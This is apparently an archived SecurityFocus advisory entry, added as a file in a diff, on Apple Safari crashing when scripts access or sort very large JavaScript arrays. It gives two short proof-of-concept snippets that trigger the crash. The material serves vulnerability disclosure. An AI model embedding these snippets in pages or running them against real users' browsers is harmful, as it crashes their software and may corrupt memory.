@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/9815/info
+
+Apple Safari Web Browser is reported to be prone to a security vulnerability related to handling of large JavaScript arrays (with 99999999999999999999999 or 0x23000000 elements). By declaring such an array and then attempting to access it, it may be possible to cause a browser crash.
+
+This issue is likely due to memory corruption but it is not known if it could be further exploitable to execute arbitrary code.
+
+var a = new Array(99999999999999999999999);
+a[0+5]="AAAAA";
+
+and:
+var bam = new Array(0x23000000);
+bam.sort(new Function("return 1"));
